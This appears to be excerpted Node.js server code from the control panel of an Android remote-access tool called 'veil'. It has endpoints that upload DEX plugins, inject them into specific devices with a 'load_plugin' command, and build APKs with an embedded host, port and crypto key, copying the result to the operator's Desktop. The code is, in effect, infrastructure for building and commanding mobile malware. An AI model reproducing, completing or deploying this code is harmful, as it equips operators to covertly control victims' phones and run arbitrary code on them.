...
router.post("/logout", requireAuth, (req, res) => {
    logout(req.headers["x-auth-token"] || (req.headers.cookie || "").split(";").map(p => p.trim()).find(p => p.startsWith("veil_session="))?.split("=")[1]);
...
router.post("/plugin/upload", requireAuth, async (req, res) => {
    ...
    if (!name || typeof name !== "string" || !/^[a-zA-Z0-9._-]+$/.test(name) || name.length > 255)
        return res.status(400).json({ error: "invalid_name" });
    if (!data || typeof data !== "string" || data.length > config.maxPluginSize * 1.4)
        return res.status(413).json({ error: "too_large" });
    if (!validateClassName(className))
        return res.status(400).json({ error: "invalid_class_name" });

    const decoded = Buffer.from(data, "base64");
    if (decoded.length > config.maxPluginSize) return res.status(413).json({ error: "too_large" });
    if (decoded.length < 112 || !decoded.subarray(0, 4).equals(DEX_MAGIC))
        return res.status(400).json({ error: "invalid_dex" });
    ...
    await dbRun("INSERT INTO plugins (id, name, filepath, className, size, checksum, created_at) VALUES (?,?,?,?,?,?,?)",
        [id, name, fpath, className, decoded.length, checksum, Date.now()]);
...
router.delete("/plugin/:id", requireAuth, async (req, res) => {
    ...
    if (row) {
        ...
        auditLog("plugin_delete", req.session.actor, id, req.ip, {}, true);
    }
    res.json({ status: "ok" });
});
...
router.post("/plugin/inject/:uid", requireAuth, async (req, res) => {
    ...
    if (row) {
        const data = fs.readFileSync(row.filepath).toString("base64");
        auditLog("plugin_inject", req.session.actor, uid, req.ip, { pluginId }, true);
        res.json(sendCmd(uid, { cmd: "load_plugin", data, className: row.className }));
    } else { res.status(404).json({ error: "not_found" }); }
});
...
router.get("/builds", requireAuth, async (req, res) => {
    try {
        ...
        for (const r of rows) {
            if (!activeBuilds.has(r.buildId)) {
                await dbRun("UPDATE builds SET status='failed' WHERE buildId=?", [r.buildId]);
            }
        }
...
router.post("/build", requireAuth, async (req, res) => {
    ...
    await dbRun("INSERT INTO builds (buildId, host, port, cryptoKey, status, created_at) VALUES (?,?,?,?,?,?)",
        [buildId, host, port, cryptoKey, "pending", Date.now()]);
    ...
    const gradlew = fs.existsSync(gradleBat) ? gradleBat : (process.platform === "win32" ? "gradlew.bat" : "./gradlew");
    if (process.platform === "win32" && !fs.existsSync(gradleBat) && !fs.existsSync(path.join(gradlePath, "gradlew.bat"))) {
        if (!gradleHome) {
            await dbRun("UPDATE builds SET status='failed' WHERE buildId=?", [buildId]);
            auditLog("build_fail", "system", buildId, "localhost", { error: "GRADLE_HOME not configured" }, false);
            return res.status(500).json({ status: "failed", error: "GRADLE_HOME not configured" });
        }
        await dbRun("UPDATE builds SET status='failed' WHERE buildId=?", [buildId]);
        auditLog("build_fail", "system", buildId, "localhost", { error: "gradle not found at " + gradleHome }, false);
    ...
    const buildEnv = Object.assign({}, process.env, { GRADLE_HOME: gradleHome, JAVA_HOME: javaHome, PATH: path.join(gradleHome, "bin") + path.delimiter + process.env.PATH });
    ...
    require("child_process").execFile(gradlew, args, { cwd: gradlePath, shell: process.platform === "win32", windowsHide: true, maxBuffer: 16 * 1024 * 1024, timeout: 10 * 60 * 1000, env: buildEnv }, (err) => {
        ...
        if (err) {
            dbRun("UPDATE builds SET status='failed' WHERE buildId=?", [buildId]);
            auditLog("build_fail", "system", buildId, "localhost", { error: (err.killed ? "build timed out after 10 min" : err.message.substring(0, 200)) }, false);
        } else {
            let apkPath = path.join(gradlePath, "app", "build", "outputs", "apk", "release", "app-release.apk");
            if (!fs.existsSync(apkPath)) {
                apkPath = path.join(gradlePath, "app", "build", "outputs", "apk", "release", "app-release-unsigned.apk");
            }
            if (fs.existsSync(apkPath)) {
                const destPath = path.join(__dirname, "..", "..", "builds", buildId + ".apk");
                fs.copyFileSync(apkPath, destPath);
                try {
                    const desktop = path.join(require("os").homedir(), "Desktop", "veil.apk");
                    fs.copyFileSync(apkPath, desktop);
                    auditLog("build_copy_desktop", "system", buildId, "localhost", { dest: desktop }, true);
                } catch (copyErr) {}
                const size = fs.statSync(destPath).size;
                dbRun("UPDATE builds SET status='complete', size=?, downloadUrl=? WHERE buildId=?",
                    [size, "/api/build/" + buildId + "/download", buildId]);
                auditLog("build_complete", "system", buildId, "localhost", { size }, true);
            } else {
                dbRun("UPDATE builds SET status='failed' WHERE buildId=?", [buildId]);
                auditLog("build_fail", "system", buildId, "localhost", { error: "apk not found after build" }, false);
            }
        }
    });
...
router.get("/settings", requireAuth, async (req, res) => {
    try {
        ...
        const settings = { tcpPort: config.socketPort, apiPort: config.apiPort, authToken: config.authToken, cfUrl: "", gasUrls: [] };
...
router.post("/settings", requireAuth, async (req, res) => {
    ...
    for (const [key, value] of Object.entries(settings)) {
        ...
        await dbRun("INSERT INTO settings (key, value) VALUES (?,?) ON CONFLICT(key) DO UPDATE SET value=?",
